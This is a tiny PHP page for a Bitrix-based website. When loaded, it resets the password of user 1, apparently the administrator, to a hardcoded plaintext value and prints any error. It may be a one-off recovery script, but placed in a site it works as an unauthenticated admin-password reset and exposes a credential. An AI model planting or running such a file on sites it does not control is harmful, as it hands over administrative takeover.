<?require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
echo $USER->Update(1, array("PASSWORD"=> "P@vlenty:2005"));
echo $USER->LAST_ERROR;
require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");?>